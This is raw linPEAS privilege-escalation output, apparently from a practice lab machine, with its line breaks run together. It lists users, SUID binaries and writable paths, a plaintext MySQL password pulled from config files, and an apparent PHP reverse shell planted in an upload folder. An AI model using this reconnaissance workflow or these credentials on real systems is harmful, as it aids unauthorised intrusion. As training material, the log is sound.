localhost127.0.1.1       academy.tcm.sec academy::1     localhost ip6-localhost ip6-loopbackff02::1 ip6-allnodesff02::2 ip6-allroutersdomain localdomainsearch localdomainnameserver 172.16.2.2tcm.sec[+] Content of /etc/inetd.conf/etc/inetd.conf Not Found                                                                                                                                                                                                                                                                                                     [+] Networks and neighboursdefault         0.0.0.0                                                                                                                                        loopback        127.0.0.0link-local      169.254.0.01: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo       valid_lft forever preferred_lft forever    inet6 ::1/128 scope host        valid_lft forever preferred_lft forever2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000    link/ether 00:0c:29:a6:6e:61 brd ff:ff:ff:ff:ff:ff    inet 172.16.2.129/24 brd 172.16.2.255 scope global dynamic ens33       valid_lft 1638sec preferred_lft 1638sec    inet6 fe80::20c:29ff:fea6:6e61/64 scope link        valid_lft forever preferred_lft forever172.16.2.254 dev ens33 lladdr 00:50:56:ed:99:be STALE172.16.2.2 dev ens33 lladdr 00:50:56:fc:a4:5b REACHABLE172.16.2.1 dev ens33 lladdr 00:50:56:c0:00:08 REACHABLE[+] Iptables rulesiptables rules Not Found                                                                                                                                                                                                                                                                                                      [+] Active Ports[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports                                                                                                                                                                                                                                           [+] Can I sniff with tcpdump?No                                                                                                                                                                                                                                                                                                                            ====================================( Users Information )=====================================[+] My user                                                                                                                                                    [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#groups                                                                                         uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                          [+] Do I have PGP keys?gpg Not Found                                                                                                                                                                                                                                                                                                                 [+] Clipboard or highlighted text?xsel and xclip Not Found                                                                                                                                                                                                                                                                                                      [+] Testing 'sudo -l' without password & /etc/sudoers[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                                                                                                                                                                                          [+] Checking /etc/doas.conf/etc/doas.conf Not Found                                                                                                                                                                                                                                                                                                      [+] Checking Pkexec policy                                                                                                                                                               [+] Don forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!                                                                                                                                                                                                                             [+] Superusersroot:x:0:0:root:/root:/bin/bash                                                                                                                                [+] Users with consolegrimmie:x:1000:1000:administrator,,,:/home/grimmie:/bin/bash                                                                                                   root:x:0:0:root:/root:/bin/bash[+] Login information 06:37:18 up  1:19,  1 user,  load average: 0.24, 0.06, 0.41                                                                                                   USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHATroot     tty1     -                10:18   29:42   0.04s  0.01s -bashroot     tty1                          Sat May 29 13:31 - down   (00:12)reboot   system boot  4.19.0-16-amd64  Sat May 29 13:30 - 13:43  (00:13)root     pts/0        192.168.10.31    Sat May 29 13:16 - 13:27  (00:11)root     tty1                          Sat May 29 13:16 - down   (00:11)reboot   system boot  4.19.0-16-amd64  Sat May 29 13:15 - 13:27  (00:12)root     pts/0        192.168.10.31    Sat May 29 13:08 - 13:14  (00:06)administ tty1                          Sat May 29 13:06 - down   (00:08)reboot   system boot  4.19.0-16-amd64  Sat May 29 13:05 - 13:14  (00:08)wtmp begins Sat May 29 13:05:58 2021[+] All users_apt                                                                                                                                                           backupbindaemonftpgamesgnatsgrimmieirclistlpmailmanmessagebusmysqlnewsnobodyproxyrootsshdsyncsyssystemd-coredumpsystemd-networksystemd-resolvesystemd-timesyncuucpwww-data[+] Password policyPASS_MAX_DAYS   99999                                                                                                                                          PASS_MIN_DAYS   0PASS_WARN_AGE   7ENCRYPT_METHOD SHA512===================================( Software Information )===================================[+] MySQL version                                                                                                                                              mysql  Ver 15.1 Distrib 10.3.27-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2                                                                      [+] MySQL connection using default root/root ........... No[+] MySQL connection using root/toor ................... No                                                                                                    [+] MySQL connection using root/NOPASS ................. No                                                                                                    [+] Looking for mysql credentials and exec                                                                                                                     From '/etc/mysql/mariadb.conf.d/50-server.cnf' Mysql user: user                    = mysql                                                                     Found readable /etc/mysql/my.cnf[client-server]!includedir /etc/mysql/conf.d/!includedir /etc/mysql/mariadb.conf.d/[+] PostgreSQL version and pgadmin credentials Not Found                                                                                                                                                                                                                                                                                                                    [+] PostgreSQL connection to template0 using postgres/NOPASS ........ No[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No                                                                                       [+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No                                                                                       [+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No                                                                                                                                                                                                                                                      [+] Apache server infoVersion: Server version: Apache/2.4.38 (Debian)                                                                                                                Server built:   2020-08-25T20:08:29[+] Looking for PHPCookies Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for Wordpress wp-config.php fileswp-config.php Not Found                                                                                                                                                                                                                                                                                                       [+] Looking for Tomcat users filetomcat-users.xml Not Found                                                                                                                                                                                                                                                                                                    [+] Mongo information Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for supervisord configuration filesupervisord.conf Not Found                                                                                                                                                                                                                                                                                                    [+] Looking for cesi configuration filecesi.conf Not Found                                                                                                                                                                                                                                                                                                           [+] Looking for Rsyncd config file/usr/share/doc/rsync/examples/rsyncd.conf                                                                                                                      [ftp]        comment = public archive        path = /var/www/pub        use chroot = yes        lock file = /var/lock/rsyncd        read only = yes        list = yes        uid = nobody        gid = nogroup        strict modes = yes        ignore errors = no        ignore nonreadable = yes        transfer logging = no        timeout = 600        refuse options = checksum dry-run        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz[+] Looking for Hostapd config filehostapd.conf Not Found                                                                                                                                                                                                                                                                                                        [+] Looking for wifi conns file Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for Anaconda-ks config filesanaconda-ks.cfg Not Found                                                                                                                                                                                                                                                                                                     [+] Looking for .vnc directories and their passwd files.vnc Not Found                                                                                                                                                                                                                                                                                                                [+] Looking for ldap directories and their hashes/etc/ldap                                                                                                                                                      The password hash is from the {SSHA} to 'structural'[+] Looking for .ovpn files and credentials.ovpn Not Found                                                                                                                                                                                                                                                                                                               [+] Looking for ssl/ssh filesPermitRootLogin yes                                                                                                                                            ChallengeResponseAuthentication noUsePAM yesLooking inside /etc/ssh/ssh_config for interesting infoHost *    SendEnv LANG LC_*    HashKnownHosts yes    GSSAPIAuthentication yes[+] Looking for unexpected auth lines in /etc/pam.d/sshdNo                                                                                                                                                                                                                                                                                                                            [+] Looking for Cloud credentials (AWS, Azure, GC)                                                                                                                                                               [+] NFS exports?[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe                                                         /etc/exports Not Found                                                                                                                                                                                                                                                                                                        [+] Looking for kerberos conf files and tickets[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt                                                                          krb5.conf Not Found                                                                                                                                            tickets kerberos Not Found                                                                                                                                     klist Not Found                                                                                                                                                                                                                                                                                                               [+] Looking for Kibana yamlkibana.yml Not Found                                                                                                                                                                                                                                                                                                          [+] Looking for logstash files Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for elasticsearch files Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for Vault-ssh filesvault-ssh-helper.hcl Not Found                                                                                                                                                                                                                                                                                                [+] Looking for AD cached hahsescached hashes Not Found                                                                                                                                                                                                                                                                                                       [+] Looking for screen sessions[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                            screen Not Found                                                                                                                                                                                                                                                                                                              [+] Looking for tmux sessions[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                            tmux Not Found                                                                                                                                                                                                                                                                                                                [+] Looking for Couchdb directory                                                                                                                                                               [+] Looking for redis.conf                                                                                                                                                               [+] Looking for dovecot filesdovecot credentials Not Found                                                                                                                                                                                                                                                                                                 [+] Looking for mosquitto.conf                                                                                                                                                               ====================================( Interesting Files )=====================================[+] SUID                                                                                                                                                       [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                    /usr/lib/eject/dmcrypt-get-device/usr/lib/openssh/ssh-keysign/usr/bin/chfn           --->    SuSE_9.3/10/usr/bin/mount          --->    Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8/usr/bin/newgrp         --->    HP-UX_10.20/usr/bin/umount         --->    BSD/Linux[1996-08-13]/usr/bin/chsh/usr/bin/passwd         --->    Apple_Mac_OSX/Solaris/SPARC_8/9/Sun_Solaris_2.5.1_PAM/usr/bin/su/usr/bin/gpasswd[+] SGID[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           /usr/sbin/unix_chkpwd                                                                                                                                          /usr/bin/bsd-write/usr/bin/expiry/usr/bin/wall/usr/bin/crontab/usr/bin/dotlockfile/usr/bin/chage/usr/bin/ssh-agent[+] Capabilities[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                                                                   /usr/bin/ping = cap_net_raw+ep                                                                                                                                 [+] .sh files in path/usr/bin/gettext.sh                                                                                                                                            [+] Files (scripts) in /etc/profile.d/total 20                                                                                                                                                       drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  664 Mar  1  2019 bash_completion.sh-rw-r--r--  1 root root 1107 Sep 14  2018 gawk.csh-rw-r--r--  1 root root  757 Sep 14  2018 gawk.sh[+] Hashes inside passwd file? ........... No[+] Can I read shadow files? ........... No                                                                                                                    [+] Can I read root folder? ........... No                                                                                                                                                                                                                                                                                    [+] Looking for root files in home dirs (limit 20)/home                                                                                                                                                          [+] Looking for root files in folders owned by me                                                                                                                                                               [+] Readable files belonging to root and readable by me but not world readable                                                                                                                                                               [+] Files inside /home/www-data (limit 20)                                                                                                                                                               [+] Files inside others home (limit 20)/home/grimmie/.bash_history                                                                                                                                    /home/grimmie/.bashrc/home/grimmie/backup.sh/home/grimmie/.profile/home/grimmie/.bash_logout[+] Looking for installed mail applications                                                                                                                                                               [+] Mails (limit 50)                                                                                                                                                               [+] Backup files?-rwxr-xr-- 1 grimmie administrator 112 May 30  2021 /home/grimmie/backup.sh                                                                                    -rwxr-xr-x 1 root root 38412 Nov 25  2020 /usr/bin/wsrep_sst_mariabackup[+] Looking for tables inside readable .db/.sqlite files (limit 100)                                                                                                                                                               [+] Web files?(output limit)/var/www/:                                                                                                                                                     total 12Kdrwxr-xr-x  3 root root 4.0K May 29  2021 .drwxr-xr-x 12 root root 4.0K May 29  2021 ..drwxr-xr-x  3 root root 4.0K May 29  2021 html/var/www/html:total 24Kdrwxr-xr-x 3 root     root     4.0K May 29  2021 .drwxr-xr-x 3 root     root     4.0K May 29  2021 ..[+] *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .gitconfig, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml                                                                                                                                                   [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data                                                                            -rw-r--r-- 1 root root 1994 Apr 18  2019 /etc/bash.bashrc                                                                                                      -rw-r--r-- 1 root root 3526 Apr 18  2019 /etc/skel/.bashrc-rw-r--r-- 1 root root 807 Apr 18  2019 /etc/skel/.profile-rw-r--r-- 1 grimmie administrator 3526 May 29  2021 /home/grimmie/.bashrc-rw-r--r-- 1 grimmie administrator 807 May 29  2021 /home/grimmie/.profile-rw-r--r-- 1 root root 2778 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc-rw-r--r-- 1 root root 802 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc-rw-r--r-- 1 root root 570 Jan 31  2010 /usr/share/base-files/dot.bashrc[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)   139266      4 -rw-r--r--   1 grimmie  administrator      220 May 29  2021 /home/grimmie/.bash_logout                                                           270249      4 -rw-r--r--   1 root     root               240 Oct 15  2020 /usr/share/phpmyadmin/vendor/paragonie/constant_time_encoding/.travis.yml   270133      4 -rw-r--r--   1 root     root               250 Oct 15  2020 /usr/share/phpmyadmin/vendor/bacon/bacon-qr-code/.travis.yml   389530      4 -rw-r--r--   1 root     root               946 Oct 15  2020 /usr/share/phpmyadmin/vendor/pragmarx/google2fa/.scrutinizer.yml   389531      4 -rw-r--r--   1 root     root               706 Oct 15  2020 /usr/share/phpmyadmin/vendor/pragmarx/google2fa/.travis.yml   140294      4 -rw-r--r--   1 root     root               608 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/extensions/.travis.yml   140341      4 -rw-r--r--   1 root     root              1004 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.travis.yml   140340      4 -rw-r--r--   1 root     root               799 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.php_cs.dist   140339      4 -rw-r--r--   1 root     root               224 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.editorconfig   270226      4 -rw-r--r--   1 root     root               633 Oct 15  2020 /usr/share/phpmyadmin/vendor/google/recaptcha/.travis.yml   138381      0 -rw-r--r--   1 root     root                 0 Nov 15  2018 /usr/share/dictionaries-common/site-elisp/.nosearch    12136      0 -rw-r--r--   1 root     root                 0 Jul 29  2023 /run/network/.ifstate.lock   260079      0 -rw-------   1 root     root                 0 May 29  2021 /etc/.pwd.lock   259843      4 -rw-r--r--   1 root     root               220 Apr 18  2019 /etc/skel/.bash_logout[+] Readable files inside /tmp, /var/tmp, /var/backups(limit 100)-rwxrwxrwx 1 www-data www-data 134167 Jul 29 06:32 /tmp/linpeas.sh                                                                                             -rw-r--r-- 1 root root 11996 May 29  2021 /var/backups/apt.extended_states.0[+] Interesting writable Files[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                                 /dev/mqueue                                                                                                                                                    /dev/mqueue/linpeas.txt/dev/shm/run/lock/run/lock/apache2/sys/kernel/security/apparmor/.access/sys/kernel/security/apparmor/.load/sys/kernel/security/apparmor/.remove/sys/kernel/security/apparmor/.replace/tmp/tmp/linpeas.sh/var/cache/apache2/mod_cache_disk/var/lib/php/sessions/var/lib/phpmyadmin/var/lib/phpmyadmin/tmp/var/lib/phpmyadmin/tmp/twig/var/lib/phpmyadmin/tmp/twig/15/var/lib/phpmyadmin/tmp/twig/15/15a885ca9738e5a84084a3e52f1f6b23c771ea4f7bdca01081f7b87d3b86a6f9.php/var/lib/phpmyadmin/tmp/twig/21/var/lib/phpmyadmin/tmp/twig/21/21a3bee2bc40466295b888b9fec6fb9d77882a7cf061fd3f3d7194b5d54ab837.php/var/lib/phpmyadmin/tmp/twig/22/var/lib/phpmyadmin/tmp/twig/22/22f328e86274b51eb9034592ac106d133734cc8f4fba3637fe76b0a4b958f16d.php/var/lib/phpmyadmin/tmp/twig/28/var/lib/phpmyadmin/tmp/twig/28/28bcfd31671cb4e1cff7084a80ef5574315cd27a4f33c530bc9ae8da8934caf6.php/var/lib/phpmyadmin/tmp/twig/2e/var/lib/phpmyadmin/tmp/twig/2e/2e6ed961bffa8943f6419f806fe7bfc2232df52e39c5880878e7f34aae869dd9.php/var/lib/phpmyadmin/tmp/twig/31/var/lib/phpmyadmin/tmp/twig/31/317c8816ee34910f2c19f0c2bd6f261441aea2562acc0463975f80a4f0ed98a9.php/var/lib/phpmyadmin/tmp/twig/36/var/lib/phpmyadmin/tmp/twig/36/360a7a01227c90acf0a097d75488841f91dc2939cebca8ee28845b8abccb62ee.php/var/lib/phpmyadmin/tmp/twig/3b/var/lib/phpmyadmin/tmp/twig/3b/3bf8a6b93e8c4961d320a65db6c6f551428da6ae8b8e0c87200629b4ddad332d.php/var/lib/phpmyadmin/tmp/twig/41/var/lib/phpmyadmin/tmp/twig/41/4161342482a4d1436d31f5619bbdbd176c50e500207e3f364662f5ba8210fe31.php/var/lib/phpmyadmin/tmp/twig/42/var/lib/phpmyadmin/tmp/twig/42/426cadcf834dab31a9c871f8a7c8eafa83f4c66a2297cfefa7aae7a7895fa955.php/var/lib/phpmyadmin/tmp/twig/43/var/lib/phpmyadmin/tmp/twig/43/43cb8c5a42f17f780372a6d8b976cafccd1f95b8656d9d9638fca2bb2c0c1ee6.php/var/lib/phpmyadmin/tmp/twig/4c/var/lib/phpmyadmin/tmp/twig/4c/4c13e8023eae0535704510f289140d5447e25e2dea14eaef5988afa2ae915cb9.php/var/lib/phpmyadmin/tmp/twig/4e/var/lib/phpmyadmin/tmp/twig/4e/4e68050e4aec7ca6cfa1665dd465a55a5d643fca6abb104a310e5145d7310851.php/var/lib/phpmyadmin/tmp/twig/4e/4e8f70ab052f0a5513536d20f156e0649e1791c083804a629624d2cb1e052f1f.php/var/lib/phpmyadmin/tmp/twig/4f/var/lib/phpmyadmin/tmp/twig/4f/4f7c1ace051b6b8cb85528aa8aef0052b72277f654cb4f13f2fc063f8529efe4.php/var/lib/phpmyadmin/tmp/twig/53/var/lib/phpmyadmin/tmp/twig/53/53ec6cf1deb6f8f805eb3077b06e6ef3b7805e25082d74c09563f91a11c1dfcd.php/var/lib/phpmyadmin/tmp/twig/5c/var/lib/phpmyadmin/tmp/twig/5c/5cf13d5a4ba7434d92bc44defee51a93cfbafa0d7984fcb8cbea606d97fe3e1a.php/var/lib/phpmyadmin/tmp/twig/61/var/lib/phpmyadmin/tmp/twig/61/61cf92e037fb131bad1ea24485b8e2ab7f0dd05dbe0bcdec85d8a96c80458223.php/var/lib/phpmyadmin/tmp/twig/6b/var/lib/phpmyadmin/tmp/twig/6b/6b8deef855b316d17c87795aebdf5aa33b55fae3e6c453d2a5bab7c4085f85d7.php/var/lib/phpmyadmin/tmp/twig/6c/var/lib/phpmyadmin/tmp/twig/6c/6c9a7cd11578d393beebc51daa9a48d35c8b03d3a69fd786c55ceedf71a62d29.php/var/lib/phpmyadmin/tmp/twig/73/var/lib/phpmyadmin/tmp/twig/73/73a22388ea06dda0a2e91e156573fc4c47961ae6e35817742bb6901eb91d5478.php/var/lib/phpmyadmin/tmp/twig/73/73ee99e209023ff62597f3f6e5f027a498c1261e4d35d310b0d0a2664f3c2c0d.php/var/lib/phpmyadmin/tmp/twig/78/var/lib/phpmyadmin/tmp/twig/78/786fc5d49e751f699117fbb46b2e5920f5cdae9b5b3e7bb04e39d201b9048164.php/var/lib/phpmyadmin/tmp/twig/7d/var/lib/phpmyadmin/tmp/twig/7d/7d8087d41c482579730682151ac3393f13b0506f63d25d3b07db85fcba5cdbeb.php/var/lib/phpmyadmin/tmp/twig/7f/var/lib/phpmyadmin/tmp/twig/7f/7f2fea86c14cdbd8cd63e93670d9fef0c3d91595972a398d9aa8d5d919c9aa63.php/var/lib/phpmyadmin/tmp/twig/8a/var/lib/phpmyadmin/tmp/twig/8a/8a16ca4dbbd4143d994e5b20d8e1e088f482b5a41bf77d34526b36523fc966d7.php/var/lib/phpmyadmin/tmp/twig/8b/var/lib/phpmyadmin/tmp/twig/8b/8b3d6e41c7dc114088cc4febcf99864574a28c46ce39fd02d9577bec9ce900de.php/var/lib/phpmyadmin/tmp/twig/96/var/lib/phpmyadmin/tmp/twig/96/96885525f00ce10c76c38335c2cf2e232a709122ae75937b4f2eafcdde7be991.php/var/lib/phpmyadmin/tmp/twig/97/var/lib/phpmyadmin/tmp/twig/97/9734627c3841f4edcd6c2b6f193947fc0a7a9a69dd1955f703f4f691af6b45e3.php/var/lib/phpmyadmin/tmp/twig/99/var/lib/phpmyadmin/tmp/twig/99/9937763182924ca59c5731a9e6a0d96c77ec0ca5ce3241eec146f7bca0a6a0dc.php/var/lib/phpmyadmin/tmp/twig/9d/var/lib/phpmyadmin/tmp/twig/9d/9d254bc0e43f46a8844b012d501626d3acdd42c4a2d2da29c2a5f973f04a04e8.php/var/lib/phpmyadmin/tmp/twig/9d/9d6c5c59ee895a239eeb5956af299ac0e5eb1a69f8db50be742ff0c61b618944.php/var/lib/phpmyadmin/tmp/twig/9e/var/lib/phpmyadmin/tmp/twig/9e/9ed23d78fa40b109fca7524500b40ca83ceec9a3ab64d7c38d780c2acf911588.php/var/lib/phpmyadmin/tmp/twig/a0/var/lib/phpmyadmin/tmp/twig/a0/a0c00a54b1bb321f799a5f4507a676b317067ae03b1d45bd13363a544ec066b7.php/var/lib/phpmyadmin/tmp/twig/a4/var/lib/phpmyadmin/tmp/twig/a4/a49a944225d69636e60c581e17aaceefffebe40aeb5931afd4aaa3da6a0039b9.php/var/lib/phpmyadmin/tmp/twig/a7/var/lib/phpmyadmin/tmp/twig/a7/a7e9ef3e1f57ef5a497ace07803123d1b50decbe0fcb448cc66573db89b48e25.php/var/lib/phpmyadmin/tmp/twig/ae/var/lib/phpmyadmin/tmp/twig/ae/ae25b735c0398c0c6a34895cf07f858207e235cf453cadf07a003940bfb9cd05.php/var/lib/phpmyadmin/tmp/twig/af/var/lib/phpmyadmin/tmp/twig/af/af668e5234a26d3e85e170b10e3d989c2c0c0679b2e5110d593a80b4f58c6443.php/var/lib/phpmyadmin/tmp/twig/af/af6dd1f6871b54f086eb95e1abc703a0e92824251df6a715be3d3628d2bd3143.php/var/lib/phpmyadmin/tmp/twig/af/afa81ff97d2424c5a13db6e43971cb716645566bd8d5c987da242dddf3f79817.php/var/lib/phpmyadmin/tmp/twig/b6/var/lib/phpmyadmin/tmp/twig/b6/b6c8adb0e14792534ce716cd3bf1d57bc78d45138e62be7d661d75a5f03edcba.php/var/lib/phpmyadmin/tmp/twig/c3/var/lib/phpmyadmin/tmp/twig/c3/c34484a1ece80a38a03398208a02a6c9c564d1fe62351a7d7832d163038d96f4.php/var/lib/phpmyadmin/tmp/twig/c5/var/lib/phpmyadmin/tmp/twig/c5/c50d1c67b497a887bc492962a09da599ee6c7283a90f7ea08084a548528db689.php/var/lib/phpmyadmin/tmp/twig/c7/var/lib/phpmyadmin/tmp/twig/c7/c70df99bff2eea2f20aba19bbb7b8d5de327cecaedb5dc3d383203f7d3d02ad2.php/var/lib/phpmyadmin/tmp/twig/ca/var/lib/phpmyadmin/tmp/twig/ca/ca32544b55a5ebda555ff3c0c89508d6e8e139ef05d8387a14389443c8e0fb49.php/var/lib/phpmyadmin/tmp/twig/d6/var/lib/phpmyadmin/tmp/twig/d6/d66c84e71db338af3aae5892c3b61f8d85d8bb63e2040876d5bbb84af484fb41.php/var/lib/phpmyadmin/tmp/twig/dd/var/lib/phpmyadmin/tmp/twig/dd/dd1476242f68168118c7ae6fc7223306d6024d66a38b3461e11a72d128eee8c1.php/var/lib/phpmyadmin/tmp/twig/e8/var/lib/phpmyadmin/tmp/twig/e8/e8184cd61a18c248ecc7e06a3f33b057e814c3c99a4dd56b7a7da715e1bc2af8.php/var/lib/phpmyadmin/tmp/twig/e9/var/lib/phpmyadmin/tmp/twig/e9/e93db45b0ff61ef08308b9a87b60a613c0a93fab9ee661c8271381a01e2fa57a.php/var/lib/phpmyadmin/tmp/twig/f5/var/lib/phpmyadmin/tmp/twig/f5/f589c1ad0b7292d669068908a26101f0ae7b5db110ba174ebc5492c80bc08508.php/var/lib/phpmyadmin/tmp/twig/fa/var/lib/phpmyadmin/tmp/twig/fa/fa249f377795e48c7d92167e29cef2fc31f50401a0bdbc95ddb51c0aec698b9e.php/var/tmp/var/www/html/academy/var/www/html/academy/admin/var/www/html/academy/admin/assets/var/www/html/academy/admin/assets/css/var/www/html/academy/admin/assets/css/bootstrap.css/var/www/html/academy/admin/assets/css/font-awesome.css/var/www/html/academy/admin/assets/css/style.css/var/www/html/academy/admin/assets/fonts/var/www/html/academy/admin/assets/fonts/FontAwesome.otf/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.eot/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.svg/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.ttf/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff2/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.eot/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.svg/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.ttf/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.woff/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.woff2/var/www/html/academy/admin/assets/img/var/www/html/academy/admin/assets/js/var/www/html/academy/admin/assets/js/bootstrap.js/var/www/html/academy/admin/assets/js/jquery-1.11.1.js/var/www/html/academy/admin/change-password.php/var/www/html/academy/admin/check_availability.php/var/www/html/academy/admin/course.php/var/www/html/academy/admin/department.php/var/www/html/academy/admin/edit-course.php/var/www/html/academy/admin/enroll-history.php/var/www/html/academy/admin/includes/var/www/html/academy/admin/includes/config.php/var/www/html/academy/admin/includes/footer.php/var/www/html/academy/admin/includes/header.php/var/www/html/academy/admin/includes/menubar.php/var/www/html/academy/admin/index.php/var/www/html/academy/admin/level.php/var/www/html/academy/admin/logout.php/var/www/html/academy/admin/manage-students.php/var/www/html/academy/admin/print.php/var/www/html/academy/admin/semester.php/var/www/html/academy/admin/session.php/var/www/html/academy/admin/student-registration.php/var/www/html/academy/admin/user-log.php/var/www/html/academy/assets/var/www/html/academy/assets/css/var/www/html/academy/assets/css/bootstrap.css/var/www/html/academy/assets/css/font-awesome.css/var/www/html/academy/assets/css/style.css/var/www/html/academy/assets/fonts/var/www/html/academy/assets/fonts/FontAwesome.otf/var/www/html/academy/assets/fonts/fontawesome-webfont.eot/var/www/html/academy/assets/fonts/fontawesome-webfont.svg/var/www/html/academy/assets/fonts/fontawesome-webfont.ttf/var/www/html/academy/assets/fonts/fontawesome-webfont.woff/var/www/html/academy/assets/fonts/fontawesome-webfont.woff2/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.eot/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.svg/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.ttf/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.woff/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.woff2/var/www/html/academy/assets/img/var/www/html/academy/assets/js/var/www/html/academy/assets/js/bootstrap.js/var/www/html/academy/assets/js/jquery-1.11.1.js/var/www/html/academy/change-password.php/var/www/html/academy/check_availability.php/var/www/html/academy/db/var/www/html/academy/db/onlinecourse.sql/var/www/html/academy/enroll-history.php/var/www/html/academy/enroll.php/var/www/html/academy/includes/var/www/html/academy/includes/config.php/var/www/html/academy/includes/footer.php/var/www/html/academy/includes/header.php/var/www/html/academy/includes/menubar.php/var/www/html/academy/index.php/var/www/html/academy/logout.php/var/www/html/academy/my-profile.php/var/www/html/academy/pincode-verification.php/var/www/html/academy/print.php/var/www/html/academy/studentphoto/var/www/html/academy/studentphoto/php-rev.php/tmp/linpeas.sh/dev/mqueue/linpeas.txt[+] Searching passwords in config PHP files$mysql_password = "My_V3ryS3cur3_P4ss";                                                                                                                        $mysql_password = "My_V3ryS3cur3_P4ss";[+] Finding IPs inside logs (limit 100)     44 /var/log/dpkg.log.1:1.8.2.1                                                                                                                                 24 /var/log/dpkg.log.1:1.8.2.3     14 /var/log/dpkg.log.1:1.8.4.3      9 /var/log/wtmp:192.168.10.31      7 /var/log/dpkg.log.1:7.43.0.2      7 /var/log/dpkg.log.1:4.8.6.1      7 /var/log/dpkg.log.1:1.7.3.2      7 /var/log/dpkg.log.1:0.5.10.2      7 /var/log/dpkg.log.1:0.19.8.1      4 /var/log/installer/status:1.2.3.3      1 /var/log/lastlog:192.168.10.31[+] Finding passwords inside logs (limit 100)/var/log/dpkg.log.1:2021-05-29 17:00:10 install base-passwd:amd64 <none> 3.5.46                                                                                /var/log/dpkg.log.1:2021-05-29 17:00:10 status half-installed base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:11 configure base-passwd:amd64 3.5.46 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:11 status half-configured base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:11 status installed base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:11 status unpacked base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:18 status half-configured base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:18 status half-installed base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:18 status unpacked base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:18 upgrade base-passwd:amd64 3.5.46 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:21 install passwd:amd64 <none> 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:21 status half-installed passwd:amd64 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:21 status unpacked passwd:amd64 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:24 configure base-passwd:amd64 3.5.46 <none>/var/log/dpkg.log.1:2021-05-29 17:00:24 status half-configured base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:24 status installed base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:24 status unpacked base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:25 configure passwd:amd64 1:4.5-1.1 <none>/var/log/dpkg.log.1:2021-05-29 17:00:25 status half-configured passwd:amd64 